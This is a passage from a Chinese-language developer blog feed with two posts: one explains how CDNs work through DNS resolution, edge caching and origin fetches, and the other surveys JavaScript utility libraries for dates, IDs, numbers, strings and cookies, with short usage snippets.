        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="ttqHt"></a></p><h2 id="CDN是什么"><a href="#CDN是什么" class="headerlink" title="CDN是什么"></a>CDN是什么</h2><p>内容分发网络（Content delivery network或Content distribution network，缩写：CDN）是指一种通过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p><p><a name="FaHam"></a></p><h2 id="为什么需要CDN"><a href="#为什么需要CDN" class="headerlink" title="为什么需要CDN"></a>为什么需要CDN</h2><p>根本上的原因是，访问速度对互联网应用的用户体验、口碑、甚至说直接的营收都有巨大的影响，任何的企业都渴望自己站点有更快的访问速度。而HTTP传输时延对web的访问速度的影响很大，在绝大多数情况下是起决定性作用的，这是由TCP&#x2F;IP协议的一些特点决定的。物理层上的原因是光速有限、信道有限，协议上的原因有丢包、慢启动、拥塞控制等。<br />要提高访问速度，最简单的做法当然就是多设置几个服务器，让终端用户离服务器“更近”。典型的例子是各类下载网站在不同地域不同运营商设置镜像站，或者是像Google那样设置多个数据中心。但是多设几个服务器的问题也不少，一是多地部署时的困难，二是一致性没法保障，三则是管理困难、成本很高。实际上，在排除多地容灾等特殊需求的情况下，对大多数公司这种做法是不太可取的。当然，这种方案真正做好了，甚至是比后续所说的使用CDN要好的。<br />CDN是一种公共服务，他本身有很多台位于不同地域、接入不同运营商的服务器，而所谓的使用CDN实质上就是让CDN作为网站的门面，用户访问到的是CDN服务器，而不是直接访问到网站。由于CDN内部对TCP的优化、对静态资源的缓存、预取，加上用户访问CDN时，会被智能地分配到最近的节点，降低大量延迟，让访问速度可以得到很大提升。<br />这样做有什么好处呢？</p><ol><li>本地Cache加速，加快访问速度</li><li>镜像服务，消除运营商之间互联的瓶颈影响，保证不同网络的用户都能得到良好的访问质量</li><li>远程加速，自动选择cache服务器</li><li>带宽优化，分担网络流量，减轻压力，</li><li>集群抗攻击</li><li>节约成本</li></ol><p><a name="aaH0P"></a></p><h2 id="CDN的原理"><a href="#CDN的原理" class="headerlink" title="CDN的原理"></a>CDN的原理</h2><blockquote><p>CDN做了两件事，一是让用户访问最近的节点，二是从缓存或者源站获取资源</p></blockquote><p>CDN有个源站的概念，源站就是提供内容的站点(网站的真实服务器), 从源站取内容的过程叫做<strong>回源</strong>。<br />每次访问的具体流程如图（以最普通的CDN为例）<br /><a href="https://cloud.githubusercontent.com/assets/5894477/22008791/4edc00b0-dcb9-11e6-9663-ed19a3fa3182.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589513075507-93ef051e-6bae-40f5-9efc-1c714ba3feb8.png#height=490&id=w8AZT&originHeight=490&originWidth=539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=539" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589513075507-93ef051e-6bae-40f5-9efc-1c714ba3feb8.png#height=490&id=w8AZT&originHeight=490&originWidth=539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=539" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></a></p><p>具体举个例子：<br />用户在首次访问 <a href="https://assets-cdn.github.com/pinned-octocat.svg">https://assets-cdn.github.com/pinned-octocat.svg</a> , 假设不委托local DNS服务器递归查询，会经历以下几个过程</p><ol><li>浏览器检查本地有没有这个东东的有效缓存，有则使用缓存，没有有效缓存则进行对<code>assets-cdn.github.com</code>的DNS查询，获得一个 CNAME记录, <code>igithub.map.fastly.net</code>,值得注意的是，多个加速域名可以解析到同一个CNAME，CDN回源和缓存的时候考虑到了hostname，👍；</li><li>进行对<code>github.map.fastly.net</code>的DNS查询，获得一个A&#x2F;AAAA记录，给出地址<code>103.245.222.133</code>（视网站不同返回的不一样，可以有多个）, 这一步对CDN来说时十分重要的，它给出了离用户最近的边缘节点；</li><li>浏览器选一个返回的地址，然后进行真正的http请求，开始向<code>103.245.222.133</code>握手，握手完了把http请求头也发给了该边缘服务器;</li><li>边缘服务器检查自己的cache里面有没有<code>[https://assets-cdn.github.com/pinned-octocat.svg](https://assets-cdn.github.com/pinned-octocat.svg)</code>这个资源，有则返回给用户，如果没有，向CDN中心服务器发起请求;</li><li>CDN中心服务器检查自己的cache里面有没有这个资源，有则返回给边缘服务器，没有则回源;</li><li>中心服务器发现客户配置了<code>github.map.fastly.net</code>的回源地址(这个只有cdn会知道，假设是<code>xxx.xxx.xxx.xxx</code>)，就把http请求发到源站地址上，源站返回后返回给请求方;</li></ol><p>可以看出CDN加速的原理很大部分是跟DNS挂钩在一起的，CDN供应商几乎一定需要一个智能DNS服务器。CDN可以拿到所有的明文数据，所以对数据安全性、保密性要求比较高的企业会选择自建CDN或者设置NS记录，指向自建的智能DNS服务器。<br />上述步骤每一步都可以缓存，注意是每一步！ 所以CDN要清除缓存很难，因为有很多服务器上的缓存要清除。无论是用户对边缘服务器的请求，还是CDN服务器的回源都可以使用https。<br />注意，实际环境中图中每个服务器都可以是集群，甚至CDN分区域中心和总中心。</p><p><a name="1Isay"></a></p><h3 id="文件更新的原理"><a href="#文件更新的原理" class="headerlink" title="文件更新的原理"></a>文件更新的原理</h3><p>用户访问使用了 CDN 技术的文件后，在多个环节都可能会产生缓存，比如用户的浏览器中、CDN 的边缘节点等。浏览器端的缓存一般通过过期时间来自动更新；而对于 CDN 节点上缓存的更新，一般是通过源站更新后，手动触发 CDN 的缓存删除操作。</p><p><a name="oLpLA"></a></p><h2 id="使用-CDN-用CDN托管静态资源"><a href="#使用-CDN-用CDN托管静态资源" class="headerlink" title="使用 CDN (用CDN托管静态资源)"></a>使用 CDN (用CDN托管静态资源)</h2><p>（使用 CDN，抛开无用的 cookie）<br />要知道，浏览器第一次打开页面的时候，浏览器缓存是起不了作任何用的；使用CDN，效果就很明显。<br /><strong>CDN缓存，也叫网关缓存、反向代理缓存</strong>。浏览器先向CDN网关发起WEB请求，网关服务器后面对应着一台或多台负载均衡源服务器，会根据它们的负载请求，动态地请求转发到合适的源服务器上。<br />通过在现有的Internet中增加一层新的CACHE(缓存)层，将网站的内容发布到最接近用户的网络”边缘“的节点，使用户可以就近取得所需的内容，提高用户访问网站的响应速度。<br />cdn从技术上全面解决由于网络带宽小、用户访问量大、网点分布不均等原因，提高用户访问网站的响应速度。<strong>CDN网络是在用户和服务器之间增加Cache层，主要是通过接管DNS实现,将用户的请求引导到Cache上获得源服务器的数据</strong>。<br />使用了CDN缓存后的网站的访问过程变为：<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589513234285-3996bc7e-36f9-4082-ba78-86916438d850.png#height=384&id=pht4z&originHeight=384&originWidth=680&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143841&status=done&style=none&title=&width=680" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589513234285-3996bc7e-36f9-4082-ba78-86916438d850.png#height=384&id=pht4z&originHeight=384&originWidth=680&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143841&status=done&style=none&title=&width=680" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><ol><li>用户输入访问的域名,操作系统向 LocalDns 查询域名的ip地址;</li><li>LocalDns 向 ROOT DNS 查询域名的授权服务器(这里假设LocalDns缓存过期);</li><li>ROOT DNS将域名授权dns记录回应给 LocalDns，LocalDns得到域名的授权dns记录后,继续向域名授权dns查询域名的ip地址;</li><li>域名授权dns 查询域名记录后(一般是CNAME)，回应给 LocalDns，LocalDns 得到域名记录后,向智能调度DNS查询域名的ip地址;</li><li>智能调度DNS 根据一定的算法和策略(比如静态拓扑，容量等),将最适合的CDN节点ip地址回应给LocalDns，LocalDns将得到的域名ip地址，回应给用户端，用户得到域名ip地址后，访问站点服务器;</li><li>CDN节点服务器应答请求，将内容返回给客户端.(缓存服务器一方面在本地进行保存，以备以后使用，二方面把获取的数据返回给客户端，完成数据服务过程)</li></ol><blockquote><p>作者：<a href="https://github.com/renaesop">renaesop</a><br>链接：<a href="https://github.com/renaesop/blog/issues/1">https://github.com/renaesop/blog/issues/1</a><br>时间：2016-05-06<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据处理库</title>
      <link href="/2022/12/04/frontend/collection/wheel/shu-ju-chu-li/"/>
      <url>/2022/12/04/frontend/collection/wheel/shu-ju-chu-li/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663397468320-4d3708fb-1bdc-4a21-8185-2bdfba047021.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663397468320-4d3708fb-1bdc-4a21-8185-2bdfba047021.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="Q7mK7"></a></p><h1 id="1-工具库"><a href="#1-工具库" class="headerlink" title="1. 工具库"></a><br />1. 工具库</h1><p><a name="mqTfI"></a></p><h2 id="（1）Lodash"><a href="#（1）Lodash" class="headerlink" title="（1）Lodash"></a>（1）Lodash</h2><p>Lodash是一个一致性、模块化、高性能、提高开发者效率的JavaScript 实用工具库。Lodash 通过降低 array、number、objects、string 等等的使用难度从而让 JavaScript 变得更简单。 Lodash 的模块化方法，非常适用于：<br />●遍历 array、object 和 string；<br />●对值进行操作和检测；<br />●创建符合功能的函数。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663344960809-61ca2ecc-899f-4bf6-8d82-1b9c39b64427.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663344960809-61ca2ecc-899f-4bf6-8d82-1b9c39b64427.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="UXOpY"></a></p><h2 id="（2）Underscore-js"><a href="#（2）Underscore-js" class="headerlink" title="（2）Underscore.js"></a>（2）Underscore.js</h2><p>Underscore.js 是一个实用的 JavaScript 工具库，它提供了一整套函数式编程的实用功能，但没有扩展任何 JavaScript 内置对象，而是将数据封装在一个自定义对象中。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663345962141-8ba80bde-78a0-4036-8127-75af27fd6d03.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663345962141-8ba80bde-78a0-4036-8127-75af27fd6d03.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="GcNN6"></a></p><h2 id="（3）Ramda"><a href="#（3）Ramda" class="headerlink" title="（3）Ramda"></a>（3）Ramda</h2><p>Ramda 的目标是专门为函数式编程风格而设计，更容易创建函数式 pipeline、且从不改变用户已有数据。Ramda 主要特性如下：<br />●Ramda 强调更加纯粹的函数式风格。数据不变性和函数无副作用是其核心设计理念。这可以帮助你使用简洁、优雅的代码来完成工作。<br />●Ramda 函数本身都是自动柯里化的。这可以让你在只提供部分参数的情况下，轻松地在已有函数的基础上创建新函数。<br />●Ramda 函数参数的排列顺序更便于柯里化。要操作的数据通常在最后面。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663345263357-d4adf726-0169-4b35-9dee-5e7042068097.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663345263357-d4adf726-0169-4b35-9dee-5e7042068097.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="qZBrQ"></a></p><h2 id="（4）Collect-js"><a href="#（4）Collect-js" class="headerlink" title="（4）Collect.js"></a>（4）Collect.js</h2><p>collect.js是 JavaScript 处理数组和对象的方便且无依赖的包装类工具。其提供了常用的数组和集合的操作API，map，reduce，filter 等集合的高级方法，设计灵感来源于 Laravel Collection。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663346140487-27c42d73-9e35-48cd-b719-d4a34fa469fd.png?x-oss-process=image/resize,w_632,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663346140487-27c42d73-9e35-48cd-b719-d4a34fa469fd.png?x-oss-process=image/resize,w_632,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="B51Yr"></a></p><h1 id="2-日期"><a href="#2-日期" class="headerlink" title="2. 日期"></a>2. 日期</h1><p><a name="A8cPr"></a></p><h2 id="（1）date-fns"><a href="#（1）date-fns" class="headerlink" title="（1）date-fns"></a>（1）date-fns</h2><p>date-fns 是一个现代的 JavaScript 日期工具类库，提供了最全面、最简单和一致的工具集，用于在浏览器和 Node.js 中操作 JavaScript 日期。其具有以下特性：<br />●<strong>模块化</strong>：根据需求选择需要引用的模块<br />●<strong>不可变</strong>：date-fns 使用纯函数构建，并且始终返回一个新的日期实例，而不是更改传递的日期实例。它允许防止错误并跳过长时间的调试会话<br />●<strong>可信赖</strong>：遵循语义版本，始终向后兼容<br />●<strong>快速</strong>：轻量快速，为用户提供最佳的使用体验<br />●<strong>TypeScript &amp; Flow</strong>：date-fns 同时支持 Flow 和 TypeScript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; format, formatDistance, formatRelative, subDays &#125; <span class="keyword">from</span> <span class="string">&#x27;date-fns&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">format</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="string">&quot;&#x27;Today is a&#x27; eeee&quot;</span>)</span><br><span class="line"><span class="comment">//=&gt; &quot;Today is a Saturday&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">formatDistance</span>(<span class="title function_">subDays</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="number">3</span>), <span class="keyword">new</span> <span class="title class_">Date</span>(), &#123; <span class="attr">addSuffix</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"><span class="comment">//=&gt; &quot;3 days ago&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">formatRelative</span>(<span class="title function_">subDays</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="number">3</span>), <span class="keyword">new</span> <span class="title class_">Date</span>())</span><br><span class="line"><span class="comment">//=&gt; &quot;last Friday at 7:26 p.m.&quot;</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/date-fns/date-fns">https://github.com/date-fns/date-fns</a></p><p><a name="JoInD"></a></p><h2 id="（2）Moment-js"><a href="#（2）Moment-js" class="headerlink" title="（2）Moment.js"></a>（2）Moment.js</h2><p>Moment.js 是一个简单易用的轻量级 JavaScript 日期处理类库，提供了日期格式化、解析、验证等功能。它支持在浏览器和 NodeJS 两种环境中运行。此类库能够将给定的任意日期转换成多种不同的格式，具有强大的日期计算功能，同时也内置了能显示多样的日期形式的函数。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663345546273-1a6234fd-3648-4512-8e43-be63227a78a0.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663345546273-1a6234fd-3648-4512-8e43-be63227a78a0.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="e8bFT"></a></p><h2 id="（3）Day-js"><a href="#（3）Day-js" class="headerlink" title="（3）Day.js"></a>（3）Day.js</h2><p>Day.js是一个极简的JavaScript库，可以为现代浏览器解析、验证、操作和显示日期和时间。其具有以下特点：<br />●和 Moment.js 相同的 API 和用法<br />●不可变数据 (Immutable)<br />●支持链式操作 (Chainable)<br />●国际化 I18n<br />●仅 2kb 大小的微型库<br />●全浏览器兼容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">dayjs</span>().<span class="title function_">format</span>();                                     <span class="comment">// 2020-09-08T13:42:32+08:00</span></span><br><span class="line"><span class="title function_">dayjs</span>().<span class="title function_">format</span>(<span class="string">&#x27;YYYY-MM-DD&#x27;</span>);                         <span class="comment">// 2020-09-08</span></span><br><span class="line"><span class="title function_">dayjs</span>().<span class="title function_">format</span>(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>);                <span class="comment">// 2020-09-08 13:47:12</span></span><br><span class="line"><span class="title function_">dayjs</span>(<span class="number">1318781876406</span>).<span class="title function_">format</span>(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>);   <span class="comment">// 2011-10-17 00</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/iamkun/dayjs/">https://github.com/iamkun/dayjs/</a></p><p><a name="bCsN7"></a></p><h1 id="3-随机值"><a href="#3-随机值" class="headerlink" title="3. 随机值"></a>3. 随机值</h1><p><a name="jnxxN"></a></p><h2 id="（1）Chance-js"><a href="#（1）Chance-js" class="headerlink" title="（1）Chance.js"></a>（1）Chance.js</h2><p>Chance 是一个轻量级的 JavaScript 随机字符串生成器插件，可帮助减少编写单调的代码，特别是在编写自动化测试时经常需要各种随机内容。可以使用它来产生随机数、字符、字符串、名字、地址、骰子等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663346553258-2cab16aa-ec04-4108-8dae-68ad28cdf65e.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663346553258-2cab16aa-ec04-4108-8dae-68ad28cdf65e.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="zJE0S"></a></p><h2 id="（2）UUID"><a href="#（2）UUID" class="headerlink" title="（2）UUID"></a>（2）UUID</h2><p>UUID 是一个用于在 JavaScript 中生成符合 RFC 的 UUID 的实用程序库。其具有以下特点：<br />●<strong>完整</strong>：支持 RFC4122 版本 1、3、4 和 5 UUID<br />●<strong>跨平台</strong>：支持CommonJS、ECMAScript 模块和 CDN 构建；Node 12, 14, 16, 18；Chrome、Safari、Firefox、Edge 浏览器；Webpack 和 rollup.js 模块打包工具；<br />●<strong>安全</strong>：加密强度高的随机值<br />●<strong>体积小</strong>：零依赖，占用空间小<br />●<strong>CLI</strong>：包括 uuid 命令行实用程序<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663346948580-38577de8-3075-45fc-9c3f-c317ed9c25e0.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663346948580-38577de8-3075-45fc-9c3f-c317ed9c25e0.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="TdjzQ"></a></p><h2 id="（3）Nano-ID"><a href="#（3）Nano-ID" class="headerlink" title="（3）Nano ID"></a>（3）Nano ID</h2><p>nanoid 是一个小巧、安全、URL友好、唯一的 JavaScript 字符串ID生成器。其具有以下特性：<br />●<strong>小巧.<strong>130 bytes (已压缩和 gzipped)。 没有依赖。Size Limit控制大小。<br />●</strong>快速.<strong>它比 UUID 快 60%。<br />●</strong>安全.<strong>它使用加密的强随机 API。可在集群中使用。<br />●</strong>紧凑.<strong>它使用比 UUID（A-Za-z0-9_-）更大的字母表。 因此，ID 大小从36个符号减少到21个符号。<br />●</strong>易用.</strong> Nano ID 已被移植到 20种编程语言。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; nanoid &#125; <span class="keyword">from</span> <span class="string">&#x27;nanoid&#x27;</span></span><br><span class="line">model.<span class="property">id</span> = <span class="title function_">nanoid</span>() <span class="comment">//=&gt; &quot;V1StGXR8_Z5jdHi6B-myT&quot;</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/ai/nanoid">https://github.com/ai/nanoid</a></p><p><a name="OICzz"></a></p><h1 id="4-数字"><a href="#4-数字" class="headerlink" title="4. 数字"></a>4. 数字</h1><p><a name="CJBLT"></a></p><h2 id="（1）Math-js"><a href="#（1）Math-js" class="headerlink" title="（1）Math.js"></a>（1）Math.js</h2><p>Math.js 是一个强大的 JavaScript 和 Node.js 数学库。它具有支持符号计算的灵活表达式解析器，带有大量内置函数和常量，并提供了一个集成的解决方案来处理不同的数据类型，如数字、大数、复数、分数、单位和矩阵。功能强大且易于使用。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663345429885-0e72b914-e929-4b6c-abad-06635795590c.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663345429885-0e72b914-e929-4b6c-abad-06635795590c.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="eeHP5"></a></p><h2 id="（2）Numeral-js"><a href="#（2）Numeral-js" class="headerlink" title="（2）Numeral.js"></a>（2）Numeral.js</h2><p>Numeral.js 是一个用来对数值进行操作和格式化的 JS 库。可将数字格式化为货币、百分比、时间，甚至是序数词的缩写（比如1st，100th）。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663395404093-ae3d768c-0ccd-4ed3-89d9-0087808855cf.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663395404093-ae3d768c-0ccd-4ed3-89d9-0087808855cf.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="VIbiK"></a></p><h2 id="（3）Accounting-js"><a href="#（3）Accounting-js" class="headerlink" title="（3）Accounting.js"></a>（3）Accounting.js</h2><p>Accounting.js 是一个用于数字、货币和货币解析&#x2F;格式化的小型 JavaScript 库。它是轻量级的，完全可本地化的，没有依赖关系，并且在客户端或服务器端都可以很好地工作。使用独立或作为 nodeJS&#x2F;npm 和 AMD&#x2F;requireJS 模块。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Default usage:</span></span><br><span class="line">accounting.<span class="title function_">formatMoney</span>(<span class="number">12345678</span>); <span class="comment">// $12,345,678.00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// European formatting (custom symbol and separators), can also use options object as second parameter:</span></span><br><span class="line">accounting.<span class="title function_">formatMoney</span>(<span class="number">4999.99</span>, <span class="string">&quot;€&quot;</span>, <span class="number">2</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;,&quot;</span>); <span class="comment">// €4.999,99</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Negative values can be formatted nicely:</span></span><br><span class="line">accounting.<span class="title function_">formatMoney</span>(-<span class="number">500000</span>, <span class="string">&quot;£ &quot;</span>, <span class="number">0</span>); <span class="comment">// £ -500,000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple `format` string allows control of symbol position (%v = value, %s = symbol):</span></span><br><span class="line">accounting.<span class="title function_">formatMoney</span>(<span class="number">5318008</span>, &#123; <span class="attr">symbol</span>: <span class="string">&quot;GBP&quot;</span>,  <span class="attr">format</span>: <span class="string">&quot;%v %s&quot;</span> &#125;); <span class="comment">// 5,318,008.00 GBP</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/openexchangerates/accounting.js">https://github.com/openexchangerates/accounting.js</a></p><p><a name="meSLV"></a></p><h1 id="5-字符串"><a href="#5-字符串" class="headerlink" title="5. 字符串"></a>5. 字符串</h1><p><a name="oCUVb"></a></p><h2 id="（1）qs"><a href="#（1）qs" class="headerlink" title="（1）qs"></a>（1）qs</h2><p>qs是一个url参数转化（parse和stringify）的JavaScript库。可以把格式化的字符串转换为对象格式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> qs = <span class="built_in">require</span>(<span class="string">&#x27;qs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> assert = <span class="built_in">require</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = qs.<span class="title function_">parse</span>(<span class="string">&#x27;a=c&#x27;</span>);</span><br><span class="line">assert.<span class="title function_">deepEqual</span>(obj, &#123; <span class="attr">a</span>: <span class="string">&#x27;c&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = qs.<span class="title function_">stringify</span>(obj);</span><br><span class="line">assert.<span class="title function_">equal</span>(str, <span class="string">&#x27;a=c&#x27;</span>);</span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/ljharb/qs">https://github.com/ljharb/qs</a></p><p><a name="O8Q54"></a></p><h2 id="（2）Voca"><a href="#（2）Voca" class="headerlink" title="（2）Voca"></a>（2）Voca</h2><p>Voca 是一个用于操作字符串的 JavaScript 库。Voca 库提供了有用的函数来使字符串操作更加舒适：更改大小写、修剪、填充、slugify、拉丁化、sprintfy、截断、转义等。模块化设计允许加载整个库或单个函数以最小化应用程序构建。该库经过全面测试、有据可查并长期受支持。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v.<span class="title function_">camelCase</span>(<span class="string">&#x27;bird flight&#x27;</span>);              <span class="comment">// =&gt; &#x27;birdFlight&#x27;</span></span><br><span class="line">v.<span class="title function_">sprintf</span>(<span class="string">&#x27;%s costs $%.2f&#x27;</span>, <span class="string">&#x27;Tea&#x27;</span>, <span class="number">1.5</span>); <span class="comment">// =&gt; &#x27;Tea costs $1.50&#x27;</span></span><br><span class="line">v.<span class="title function_">slugify</span>(<span class="string">&#x27;What a wonderful world&#x27;</span>);     <span class="comment">// =&gt; &#x27;what-a-wonderful-world&#x27;</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/panzerdp/voca">https://github.com/panzerdp/voca</a></p><p><a name="Fa7TA"></a></p><h1 id="6-存储"><a href="#6-存储" class="headerlink" title="6. 存储"></a>6. 存储</h1><p><a name="GklnF"></a></p><h2 id="（1）js-cookie-js"><a href="#（1）js-cookie-js" class="headerlink" title="（1）js-cookie.js"></a>（1）js-cookie.js</h2><p>js-cookie.js 是一个用于处理浏览器 cookie 的简单、轻量级 JavaScript API。其具有以下特点：<br />●适用于所有浏览器<br />●接受任何字符<br />●经过大量测试<br />●无依赖<br />●支持ES模块<br />●支持 AMD&#x2F;CommonJS<br />●符合RFC 6265<br />●有用的维基<br />●启用自定义编码&#x2F;解码<br />●&lt; 800 字节压缩！<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663396381742-4045b423-ce34-4963-8cb3-ceedcfbf01de.png?x-oss-process=image/resize,w_632,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663396381742-4045b423-ce34-4963-8cb3-ceedcfbf01de.png?x-oss-process=image/resize,w_632,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="bW0B6"></a></p><h2 id="（2）Cookies"><a href="#（2）Cookies" class="headerlink" title="（2）Cookies"></a>（2）Cookies</h2><p>Cookies 是一个用于获取和设置 HTTP(S) cookie的node.js模块。它的特点如下：<br />●允许使用Keygrip来签署cookie，以防止篡改；<br />●延迟验证cookie，以降低成本；<br />●不允许通过不安全的套接字发送安全cookies；<br />●默认情况下，所有cookie都仅适用于HTTP，并且通过SSL发送的cookie是安全的；<br />●允许其他库在不知道签名机制的情况下访问 cookie。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 